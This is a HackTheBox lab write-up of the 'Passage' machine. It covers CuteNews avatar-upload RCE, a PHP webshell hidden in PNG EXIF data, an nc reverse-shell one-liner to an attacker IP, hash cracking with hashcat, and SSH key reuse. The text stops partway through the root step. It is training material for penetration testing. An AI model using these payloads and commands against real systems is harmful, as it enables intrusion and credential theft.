href=/posts/cybersecurity/hackthebox/machines/windows/optimum/ title="[HTB] Machine: Optimum">[HTB] Machine: Optimum</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/outdated/ title="[HTB] Machine: Outdated">[HTB] Machine: Outdated</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/pivotapi/ title="[HTB] Machine: PivotAPI">[HTB] Machine: PivotAPI</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/querier/ title="[HTB] Machine: Querier">[HTB] Machine: Querier</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/rabbit/ title="[HTB] Machine: Rabbit">[HTB] Machine: Rabbit</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/reel/ title="[HTB] Machine: Reel">[HTB] Machine: Reel</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/reel2/ title="[HTB] Machine: Reel2">[HTB] Machine: Reel2</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/remote/ title="[HTB] Machine: Remote">[HTB] Machine: Remote</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/resolute/ title="[HTB] Machine: Resolute">[HTB] Machine: Resolute</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/return/ title="[HTB] Machine: Return">[HTB] Machine: Return</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/sauna/ title="[HTB] Machine: Sauna">[HTB] Machine: Sauna</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/scrambled/ title="[HTB] Machine: Scrambled">[HTB] Machine: Scrambled</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/search/ title="[HTB] Machine: Search">[HTB] Machine: Search</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/secnotes/ title="[HTB] Machine: SecNotes">[HTB] Machine: SecNotes</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/servmon/ title="[HTB] Machine: Servmon">[HTB] Machine: Servmon</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/sharp/ title="[HTB] Machine: Sharp">[HTB] Machine: Sharp</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/silo/ title="[HTB] Machine: Silo">[HTB] Machine: Silo</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/sizzle/ title="[HTB] Machine: Sizzle">[HTB] Machine: Sizzle</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/sniper/ title="[HTB] Machine: Sniper">[HTB] Machine: Sniper</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/streamio/ title="[HTB] Machine: StreamIO">[HTB] Machine: StreamIO</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/support/ title="[HTB] Machine: Support">[HTB] Machine: Support</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/tally/ title="[HTB] Machine: Tally">[HTB] Machine: Tally</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/timelapse/ title="[HTB] Machine: Timelapse">[HTB] Machine: Timelapse</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/toolbox/ title="[HTB] Machine: Toolbox">[HTB] Machine: Toolbox</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/worker/ title="[HTB] Machine: Worker">[HTB] Machine: Worker</a></li></ul></li></ul></li><li><a href=/posts/cybersecurity/hackthebox/overview/ title="[HTB] Overview">[HTB] Overview</a></li></ul></li><li><i class="fas fa-plus-circle"></i><a href=/posts/cybersecurity/pentesting/>Pentesting</a><ul><li><a href=/posts/cybersecurity/pentesting/active_directory/ title="[Pentesting] Active Directory">[Pentesting] Active Directory</a></li><li><a href=/posts/cybersecurity/pentesting/attacking_services/ title="[Pentesting] Attacking Services">[Pentesting] Attacking Services</a></li><li><a href=/posts/cybersecurity/pentesting/file_transfers/ title="[Pentesting] File Transfers">[Pentesting] File Transfers</a></li><li><a href=/posts/cybersecurity/pentesting/footprinting_and_enumeration/ title="[Pentesting] Footprinting and Enumeration">[Pentesting] Footprinting and Enumeration</a></li><li><a href=/posts/cybersecurity/pentesting/linux_privilege_escalation/ title="[Pentesting] Linux Privilege Escalation">[Pentesting] Linux Privilege Escalation</a></li><li><a href=/posts/cybersecurity/pentesting/mobile_pentesting/ title="[Pentesting] Mobile Pentesting">[Pentesting] Mobile Pentesting</a></li><li><a href=/posts/cybersecurity/pentesting/network_pentesting/ title="[Pentesting] Network Pentesting">[Pentesting] Network Pentesting</a></li><li><a href=/posts/cybersecurity/pentesting/osint/ title="[Pentesting] OSINT">[Pentesting] OSINT</a></li><li><a href=/posts/cybersecurity/pentesting/pivoting_tunneling_and_port_forwarding/ title="[Pentesting] Pivoting, Tunneling and Port Forwarding">[Pentesting] Pivoting, Tunneling and Port Forwarding</a></li><li><a href=/posts/cybersecurity/pentesting/shells_and_payloads/ title="[Pentesting] Shells and Payloads">[Pentesting] Shells and Payloads</a></li><li><a href=/posts/cybersecurity/pentesting/web_attacks/ title="[Pentesting] Web Attacks">[Pentesting] Web Attacks</a></li><li><a href=/posts/cybersecurity/pentesting/windows_privilege_escalation/ title="[Pentesting] Windows Privilege Escalation">[Pentesting] Windows Privilege Escalation</a></li></ul></li><li><i class="fas fa-plus-circle"></i><a href=/posts/cybersecurity/pwn.college/>pwn.college</a><ul><li><a href=/posts/cybersecurity/pwn.college/overview/ title="[pwn.college] Overview">[pwn.college] Overview</a></li></ul></li></ul></li><li><i class="fas fa-plus-circle"></i><a href=/posts/projects/>Projects</a><ul><li><a href=/posts/projects/ums/ title="[Projects] User-mode Scheduling (UMS)">[Projects] User-mode Scheduling (UMS)</a></li></ul></li></div></ul></div></div></div></section><section class=content-section id=content-section><div class=content><div class="container p-0 read-area"><div class="hero-area col-sm-12" id=hero-area style=background-image:url(/posts/cybersecurity/hackthebox/machines/linux/passage/images/passage.png)></div><div class=page-content><div class="author-profile ml-auto align-self-lg-center"><img class=rounded-circle src=/images/logo_hub369d6c5ab3ad73350236cbc9a72876b_254257_120x120_fit_box_3.png alt="Author Image"><h5 class=author-name>Bektur Umarbaev</h5><p>Saturday, October 28, 2023</p></div><div class=title><h1>[HTB] Machine: Passage</h1></div><div class=taxonomy-terms><ul style=padding-left:0><li class=rounded><a href=/tags/htb/ class="btn, btn-sm">HTB</a></li><li class=rounded><a href=/tags/cutenews/ class="btn, btn-sm">cutenews</a></li><li class=rounded><a href=/tags/webshell/ class="btn, btn-sm">webshell</a></li><li class=rounded><a href=/tags/upload/ class="btn, btn-sm">upload</a></li><li class=rounded><a href=/tags/searchsploit/ class="btn, btn-sm">searchsploit</a></li><li class=rounded><a href=/tags/source-code/ class="btn, btn-sm">source-code</a></li><li class=rounded><a href=/tags/base64/ class="btn, btn-sm">base64</a></li><li class=rounded><a href=/tags/hashcat/ class="btn, btn-sm">hashcat</a></li><li class=rounded><a href=/tags/vim/ class="btn, btn-sm">vim</a></li><li class=rounded><a href=/tags/usbcreator/ class="btn, btn-sm">usbcreator</a></li><li class=rounded><a href=/tags/arbitrary-write/ class="btn, btn-sm">arbitrary-write</a></li><li class=rounded><a href=/tags/arbitrary-read/ class="btn, btn-sm">arbitrary-read</a></li><li class=rounded><a href=/tags/passwd/ class="btn, btn-sm">passwd</a></li></ul></div><div class=post-content id=post-content><h1 id=passage>Passage</h1><h2 id=enumeration>Enumeration</h2><ul><li><code>nmap</code></li></ul><pre tabindex=0><code>└─$ nmap -Pn -p- 10.10.10.206 --min-rate 5000                   
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-29 19:01 GMT
Nmap scan report for 10.10.10.206 (10.10.10.206)
Host is up (0.17s latency).
Not shown: 65468 filtered tcp ports (no-response), 65 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 26.64 seconds
</code></pre><pre tabindex=0><code>└─$ nmap -Pn -p22,80 -sC -sV 10.10.10.206 --min-rate 5000
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-29 19:05 GMT
Nmap scan report for 10.10.10.206 (10.10.10.206)
Host is up (0.19s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)
|   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)
|_  256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Passage News
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.01 seconds
</code></pre><ul><li>Web server</li></ul><p><img src=./images/1.png></p><ul><li>The message is:</li></ul><pre tabindex=0><code>Due to unusually large amounts of traffic, we have implemented Fail2Ban on our website. Let it be known that excessive access to our server will be met with a two minute ban on your IP Address. While we do not wish to lock out our legitimate users, this decision is necessary in order to ensure a safe viewing experience. Please proceed with caution as you browse through our extensive news selection.
</code></pre><ul><li>So I skip directory bruteforcing<ul><li>We can collect all possible usernames from the articles</li><li>And we see <code>RSS</code> button on main page<ul><li>If we click it, we are navigated to <code>RSS Feed</code></li></ul></li></ul></li></ul><p><img src=./images/2.png></p><ul><li>If we remove <code>rss.php</code>, we are navigated to login page of <code>CuteNews 2.1.2</code></li></ul><p><img src=./images/3.png></p><ul><li>We have a hit in <code>searchsploit</code><ul><li><a href=https://www.exploit-db.com/exploits/48800 target=_blank rel=noopener>https://www.exploit-db.com/exploits/48800</a></li><li>It looks like it&rsquo;s and <code>RCE</code> via user <code>avatar</code></li></ul></li></ul><p><img src=./images/4.png></p><ul><li>So based on the exploit, we have to upload an user <code>avatar</code> with a webshell<ul><li>Let&rsquo;s register</li></ul></li></ul><p><img src=./images/5.png></p><ul><li>Now we have to upload the avatar<ul><li>If try to upload <code>shell.php</code>, I receive an error</li></ul></li></ul><p><img src=./images/6.png></p><p><img src=./images/7.png></p><ul><li>Let&rsquo;s use image file and add comments to it<ul><li>Use <code>png</code>, since <code>jpg</code> didn&rsquo;t work for me</li></ul></li></ul><pre tabindex=0><code>└─$ exiftool -Comment=&#39;&lt;?php echo &#34;&lt;pre&gt;&#34;; system($_GET[&#34;cmd&#34;]); echo &#34;&lt;/pre&gt;&#34;; ?&gt;&#39; avatar.png 
Warning: [minor] Text/EXIF chunk(s) found after PNG IDAT (fixed) - avatar.png
    1 image files updated
</code></pre><ul><li>I&rsquo;ll turn intercept in <code>Burp</code> and modify the extension to <code>php</code> and forward the request</li></ul><p><img src=./images/8.png></p><p><img src=./images/9.png></p><ul><li>We have <code>rce</code></li></ul><p><img src=./images/10.png></p><ul><li>Let&rsquo;s get reverse shell<ul><li><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&amp;1|nc 10.10.16.4 6666 >/tmp/f</code> - url-encoded</li></ul></li></ul><p><img src=./images/11.png></p><h2 id=user-1>User #1</h2><ul><li>Inside <code>/var/www/html/CuteNews/</code> we have <code>cdata</code> folder with <code>users</code> folder</li></ul><pre tabindex=0><code>www-data@passage:/var/www/html/CuteNews/cdata$ ls -lha
total 112K
drwxrwxrwx 11 www-data www-data 4.0K Nov  1 08:51 .
drwxrwxr-x  9 www-data www-data 4.0K Jun 18  2020 ..
-rw-rw-rw-  1 www-data www-data 2.1K Aug 20  2018 Default.tpl
-rw-rw-rw-  1 www-data www-data 1.7K Aug 20  2018 Headlines.tpl
drwxrwxrwx  2 www-data www-data 4.0K Aug 20  2018 archives
-rwxrwxrwx  1 www-data www-data    0 Aug 20  2018 auto_archive.db.php
drwxrwxrwx  2 www-data www-data 4.0K Jun 18  2020 backup
drwxrwxrwx  2 www-data www-data 4.0K Aug 31  2020 btree
drwxrwxrwx  2 www-data www-data 4.0K Aug 20  2018 cache
-rwxrwxrwx  1 www-data www-data    0 Aug 20  2018 cat.num.php
-rwxrwxrwx  1 www-data www-data    0 Aug 20  2018 category.db.php
-rw-rw-rw-  1 www-data www-data    0 Aug 20  2018 comments.txt
-rwxr-xr-x  1 www-data www-data  33K Jun 18  2020 conf.php
-rwxrwxrwx  1 www-data www-data 1.7K Aug 20  2018 config.php
-rwxrwxrwx  1 www-data www-data   15 Aug 20  2018 confirmations.php
-rwxrwxrwx  1 www-data www-data    0 Aug 20  2018 csrf.php
-rwxrwxrwx  1 www-data www-data    0 Aug 20  2018 flood.db.php
-rw-r--r--  1 www-data www-data   26 Jun 18  2020 flood.txt
-rwxrwxrwx  1 www-data www-data    0 Aug 20  2018 idnews.db.php
-rw-rw-rw-  1 www-data www-data    0 Aug 20  2018 installed.mark
-rwxrwxrwx  1 www-data www-data    0 Aug 20  2018 ipban.db.php
drwxrwxrwx  2 www-data www-data 4.0K Jun 18  2020 log
drwxrwxrwx  2 www-data www-data 4.0K Aug 31  2020 news
-rw-rw-rw-  1 www-data www-data    0 Aug 20  2018 news.txt
-rw-rw-rw-  1 www-data www-data    0 Aug 20  2018 newsid.txt
drwxrwxrwx  2 www-data www-data 4.0K Jun 18  2020 plugins
-rw-rw-rw-  1 www-data www-data    0 Aug 20  2018 postponed_news.txt
-rwxrwxrwx  1 www-data www-data    0 Aug 20  2018 replaces.php
-rw-rw-rw-  1 www-data www-data  564 Aug 20  2018 rss.tpl
-rwxrwxrwx  1 www-data www-data    0 Aug 20  2018 rss_config.php
drwxrwxrwx  2 www-data www-data 4.0K Aug 20  2018 template
-rw-rw-rw-  1 www-data www-data    0 Aug 20  2018 unapproved_news.txt
drwxrwxrwx  2 www-data www-data 4.0K Nov  1 09:07 users
-rwxrwxrwx  1 www-data www-data   58 Aug 20  2018 users.db.php
-rw-r--r--  1 www-data www-data   63 Nov  1 08:51 users.txt
</code></pre><ul><li>It contains files which looks like <code>user</code> files</li></ul><pre tabindex=0><code>www-data@passage:/var/www/html/CuteNews/cdata/users$ ls -lha
total 100K
drwxrwxrwx  2 www-data www-data 4.0K Nov  1 09:07 .
drwxrwxrwx 11 www-data www-data 4.0K Nov  1 08:51 ..
-rwxr-xr-x  1 www-data www-data  133 Jun 18  2020 09.php
-rw-r--r--  1 www-data www-data  109 Aug 30  2020 0a.php
-rw-r--r--  1 www-data www-data  129 Nov  1 08:51 0c.php
-rw-r--r--  1 www-data www-data  125 Aug 30  2020 16.php
-rwxr-xr-x  1 www-data www-data  437 Jun 18  2020 21.php
-rw-r--r--  1 www-data www-data  109 Aug 31  2020 32.php
-rw-r--r--  1 www-data www-data  581 Nov  1 09:07 46.php
-rwxr-xr-x  1 www-data www-data  113 Jun 18  2020 52.php
-rwxr-xr-x  1 www-data www-data  129 Jun 18  2020 5d.php
-rwxr-xr-x  1 www-data www-data  129 Jun 18  2020 66.php
-rw-r--r--  1 www-data www-data  133 Aug 31  2020 6e.php
-rwxr-xr-x  1 www-data www-data  117 Jun 18  2020 77.php
-rwxr-xr-x  1 www-data www-data  481 Jun 18  2020 7a.php
-rwxr-xr-x  1 www-data www-data  109 Jun 18  2020 8f.php
-rwxr-xr-x  1 www-data www-data  129 Jun 18  2020 97.php
-rwxr-xr-x  1 www-data www-data  489 Jun 18  2020 b0.php
-rw-r--r--  1 www-data www-data  109 Nov  1 08:51 b5.php
-rwxr-xr-x  1 www-data www-data  481 Jun 18  2020 c8.php
-rwxr-xr-x  1 www-data www-data   45 Jun 18  2020 d4.php
-rwxr-xr-x  1 www-data www-data   45 Jun 18  2020 d5.php
-rw-r--r--  1 www-data www-data 1.2K Aug 31  2020 d6.php
-rwxr-xr-x  1 www-data www-data  113 Jun 18  2020 fc.php
-rw-r--r--  1 www-data www-data 3.8K Aug 30  2020 lines
-rw-r--r--  1 www-data www-data    0 Jun 18  2020 users.txt
</code></pre><ul><li>File content</li></ul><pre tabindex=0><code>ww-data@passage:/var/www/html/CuteNews/cdata/users$ cat 0a.php 
&lt;?php die(&#39;Direct call - access denied&#39;); ?&gt;
YToxOntzOjI6ImlkIjthOjE6e2k6MTU5ODgyOTgzMztzOjY6ImVncmU1NSI7fX0=
</code></pre><ul><li>If we check source code, it looks those files were generated using first 2 chars of the <code>md5sum</code> of the username<ul><li><code>core/db/coreflat.php</code></li></ul></li></ul><pre tabindex=0><code>&lt;SNIP&gt;
function db_user_by_name($name, $index = FALSE)
{
    $uex = array();

    // Get from php-serialized array
    $cu = cn_touch_get(SERVDIR. path_construct(&#39;cdata&#39;,&#39;users&#39;,substr(md5($name), 0, 2).&#39;.php&#39;));

    // Check at index
    if ($index)
    {
        $rd = fopen(cn_touch(SERVDIR . path_construct(&#39;cdata&#39;, &#39;users&#39;, &#39;users.txt&#39;)), &#39;r&#39;);
        while ($a = fgets($rd))
        {
            list($uid) = explode(&#39;:&#39;, 2);
            $uex[base_convert($uid, 36, 10)] = TRUE;
        }
        fclose($rd);

        // user exists, but not in index
        if (isset($cu[&#39;name&#39;][$name]) &amp;&amp; !isset($uex[ $cu[&#39;name&#39;][$name][&#39;id&#39;] ]))
        {
            return NULL;
        }
    }
&lt;SNIP&gt;
</code></pre><ul><li>We know that this box has 2 users<ul><li>Let&rsquo;s check their files</li></ul></li></ul><pre tabindex=0><code>www-data@passage:/var/www/html/CuteNews/cdata/users$ ls /home
nadav  paul
</code></pre><pre tabindex=0><code>www-data@passage:/var/www/html/CuteNews/cdata/users$ echo -n nadav | md5sum
41e6ffead3de2412a078b075e053fdc0  -
www-data@passage:/var/www/html/CuteNews/cdata/users$ echo -n paul | md5sum
6c63212ab48e8401eaf6b59b95d816a9  -
</code></pre><ul><li>But there are no files with those ids<ul><li>The content of the file looked like <code>base64</code> let&rsquo;s try to decode it</li></ul></li></ul><pre tabindex=0><code>www-data@passage:/var/www/html/CuteNews/cdata/users$ echo &#34;YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6MTA6InBhdWwtY29sZXMiO319&#34; | base64 -d
a:1:{s:5:&#34;email&#34;;a:1:{s:16:&#34;paul@passage.htb&#34;;s:10:&#34;paul-coles&#34;;}}
</code></pre><ul><li>Looks like it&rsquo;s user information<ul><li>Let&rsquo;s decode all files</li></ul></li></ul><pre tabindex=0><code>www-data@passage:/var/www/html/CuteNews/cdata/users$ for file in `ls *.php`; do (cat $file | grep -v &#39;php&#39; | base64 -d | grep pass); done
a:1:{s:5:&#34;email&#34;;a:1:{s:16:&#34;paul@passage.htb&#34;;s:10:&#34;paul-coles&#34;;}}
a:1:{s:4:&#34;name&#34;;a:1:{s:5:&#34;admin&#34;;a:8:{s:2:&#34;id&#34;;s:10:&#34;1592483047&#34;;s:4:&#34;name&#34;;s:5:&#34;admin&#34;;s:3:&#34;acl&#34;;s:1:&#34;1&#34;;s:5:&#34;email&#34;;s:17:&#34;nadav@passage.htb&#34;;s:4:&#34;pass&#34;;s:64:&#34;7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1&#34;;s:3:&#34;lts&#34;;s:10:&#34;1592487988&#34;;s:3:&#34;ban&#34;;s:1:&#34;0&#34;;s:3:&#34;cnt&#34;;s:1:&#34;2&#34;;}}}
a:1:{s:4:&#34;name&#34;;a:1:{s:7:&#34;pentest&#34;;a:9:{s:2:&#34;id&#34;;s:10:&#34;1698853880&#34;;s:4:&#34;name&#34;;s:7:&#34;pentest&#34;;s:3:&#34;acl&#34;;s:1:&#34;4&#34;;s:5:&#34;email&#34;;s:16:&#34;pentest@mail.htb&#34;;s:4:&#34;nick&#34;;s:7:&#34;pentest&#34;;s:4:&#34;pass&#34;;s:64:&#34;01ba02d06a6a2c7997f53541352c08af02b64272267df3ce1b7c175816041c25&#34;;s:4:&#34;more&#34;;s:60:&#34;YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==&#34;;s:6:&#34;avatar&#34;;s:25:&#34;avatar_pentest_avatar.php&#34;;s:6:&#34;e-hide&#34;;s:0:&#34;&#34;;}}}
a:1:{s:5:&#34;email&#34;;a:1:{s:17:&#34;nadav@passage.htb&#34;;s:5:&#34;admin&#34;;}}
a:1:{s:4:&#34;name&#34;;a:1:{s:9:&#34;sid-meier&#34;;a:9:{s:2:&#34;id&#34;;s:10:&#34;1592483281&#34;;s:4:&#34;name&#34;;s:9:&#34;sid-meier&#34;;s:3:&#34;acl&#34;;s:1:&#34;3&#34;;s:5:&#34;email&#34;;s:15:&#34;sid@example.com&#34;;s:4:&#34;nick&#34;;s:9:&#34;Sid Meier&#34;;s:4:&#34;pass&#34;;s:64:&#34;4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88&#34;;s:3:&#34;lts&#34;;s:10:&#34;1592485645&#34;;s:3:&#34;ban&#34;;s:1:&#34;0&#34;;s:3:&#34;cnt&#34;;s:1:&#34;2&#34;;}}}
a:1:{s:4:&#34;name&#34;;a:1:{s:10:&#34;paul-coles&#34;;a:9:{s:2:&#34;id&#34;;s:10:&#34;1592483236&#34;;s:4:&#34;name&#34;;s:10:&#34;paul-coles&#34;;s:3:&#34;acl&#34;;s:1:&#34;2&#34;;s:5:&#34;email&#34;;s:16:&#34;paul@passage.htb&#34;;s:4:&#34;nick&#34;;s:10:&#34;Paul Coles&#34;;s:4:&#34;pass&#34;;s:64:&#34;e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd&#34;;s:3:&#34;lts&#34;;s:10:&#34;1592485556&#34;;s:3:&#34;ban&#34;;s:1:&#34;0&#34;;s:3:&#34;cnt&#34;;s:1:&#34;2&#34;;}}}
a:1:{s:4:&#34;name&#34;;a:1:{s:9:&#34;kim-swift&#34;;a:9:{s:2:&#34;id&#34;;s:10:&#34;1592483309&#34;;s:4:&#34;name&#34;;s:9:&#34;kim-swift&#34;;s:3:&#34;acl&#34;;s:1:&#34;3&#34;;s:5:&#34;email&#34;;s:15:&#34;kim@example.com&#34;;s:4:&#34;nick&#34;;s:9:&#34;Kim Swift&#34;;s:4:&#34;pass&#34;;s:64:&#34;f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca&#34;;s:3:&#34;lts&#34;;s:10:&#34;1592487096&#34;;s:3:&#34;ban&#34;;s:1:&#34;0&#34;;s:3:&#34;cnt&#34;;s:1:&#34;3&#34;;}}}
a:1:{s:4:&#34;name&#34;;a:2:{s:6:&#34;egre55&#34;;a:11:{s:2:&#34;id&#34;;s:10:&#34;1598829833&#34;;s:4:&#34;name&#34;;s:6:&#34;egre55&#34;;s:3:&#34;acl&#34;;s:1:&#34;4&#34;;s:5:&#34;email&#34;;s:15:&#34;egre55@test.com&#34;;s:4:&#34;nick&#34;;s:6:&#34;egre55&#34;;s:4:&#34;pass&#34;;s:64:&#34;4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc&#34;;s:4:&#34;more&#34;;s:60:&#34;YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==&#34;;s:3:&#34;lts&#34;;s:10:&#34;1598906881&#34;;s:3:&#34;ban&#34;;s:1:&#34;0&#34;;s:6:&#34;avatar&#34;;s:26:&#34;avatar_egre55_ykxnacpt.php&#34;;s:6:&#34;e-hide&#34;;s:0:&#34;&#34;;}s:6:&#34;hacker&#34;;a:11:{s:2:&#34;id&#34;;s:10:&#34;1598910896&#34;;s:4:&#34;name&#34;;s:6:&#34;hacker&#34;;s:3:&#34;acl&#34;;s:1:&#34;4&#34;;s:5:&#34;email&#34;;s:20:&#34;hacker@hacker.hacker&#34;;s:4:&#34;nick&#34;;s:6:&#34;hacker&#34;;s:4:&#34;pass&#34;;s:64:&#34;e7d3685715939842749cc27b38d0ccb9706d4d14a5304ef9eee093780eab5df9&#34;;s:3:&#34;lts&#34;;s:10:&#34;1598910911&#34;;s:3:&#34;ban&#34;;s:1:&#34;0&#34;;s:4:&#34;more&#34;;s:60:&#34;YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==&#34;;s:6:&#34;avatar&#34;;s:26:&#34;avatar_hacker_jpyoyskt.php&#34;;s:6:&#34;e-hide&#34;;s:0:&#34;&#34;;}}}
</code></pre><ul><li>Now we have</li></ul><pre tabindex=0><code>nadav:7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e
sid-meier:4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
paul-coles:e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
kim-swift:f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
egre55:4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc
hacker:e7d3685715939842749cc27b38d0ccb9706d4d14a5304ef9eee093780eab5df9
</code></pre><ul><li>I&rsquo;ll start <code>hashcat</code></li></ul><pre tabindex=0><code>└─$ hashcat -m 1400 hash /usr/share/wordlists/rockyou.txt --user 
hashcat (v6.2.6) starting
&lt;SNIP&gt;
e7d3685715939842749cc27b38d0ccb9706d4d14a5304ef9eee093780eab5df9:hacker
e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd:atlanta1
Approaching final keyspace - workload adjusted.      
&lt;SNIP&gt;
</code></pre><pre tabindex=0><code>paul-coles: atlanta1
hacker: hacker
</code></pre><ul><li>Let&rsquo;s try to <code>su</code></li></ul><pre tabindex=0><code>www-data@passage:/var/www/html/CuteNews/cdata/users$ su - paul
Password: 
paul@passage:~$ 
</code></pre><h2 id=user-2>User #2</h2><ul><li><code>.ssh</code> contained both private and public keys</li></ul><pre tabindex=0><code>paul@passage:~$ ls -lha .ssh/
total 24K
drwxr-xr-x  2 paul paul 4.0K Jul 21  2020 .
drwxr-x--- 16 paul paul 4.0K Sep  2  2020 ..
-rw-r--r--  1 paul paul  395 Jul 21  2020 authorized_keys
-rw-------  1 paul paul 1.7K Jul 21  2020 id_rsa
-rw-r--r--  1 paul paul  395 Jul 21  2020 id_rsa.pub
-rw-r--r--  1 paul paul 1.3K Jul 21  2020 known_hosts
</code></pre><ul><li>If we check public key, it shows <code>nadav</code></li></ul><pre tabindex=0><code>paul@passage:~/.ssh$ cat id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage
</code></pre><ul><li>Using the private key to <code>ssh</code> as <code>nadav</code> works</li></ul><pre tabindex=0><code>paul@passage:~/.ssh$ ssh nadav@localhost -i id_rsa
Last login: Mon Aug 31 15:07:54 2020 from 127.0.0.1
nadav@passage:~$ 
</code></pre><h2 id=root>Root</h2><ul><li><code>groups</code><ul><li>No password, so can&rsquo;t <code>sudo -l</code></li></ul></li></ul><pre tabindex=0><code>nadav@passage:~$ id
uid=1000(nadav) gid=1000(nadav) groups=1000(nadav),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
nadav@passage:~$ 
</code></pre><ul><li><code>nadav</code> has <code>.viminfo</code> file<ul><li><code>If you exit Vim and later start it again, you would normally lose a lot of information. The viminfo file can be used to remember that information, which enables you to continue where you left off.</code></li><li><a href=https://vimhelp.org/starting.txt.html#viminfo target=_blank rel=noopener>https://vimhelp.org/starting.txt.html#viminfo</a></li></ul></li></ul><pre tabindex=0><code>nadav@passage:~$ cat .viminfo 
# This viminfo file was generated by Vim 7.4.
&lt;SNIP&gt;
# File marks:
&#39;0  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
&#39;1  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf

# Jumplist (newest first):
-&#39;  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
-&#39;  1  0  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
-&#39;  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-&#39;  1  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-&#39;  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-&#39;  1  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf

# History of marks within files (newest to oldest):

&gt; /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
        &#34;       12      7

&gt; /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
        &#34;       2       0
        .       2       0
        +       2       0
</code></pre><ul><li>Both files owned by <code>root</code></li></ul><pre tabindex=0><code>nadav@passage:~$ ls -l /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
-rw-r--r-- 1 root root 766 Apr 29  2015 /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
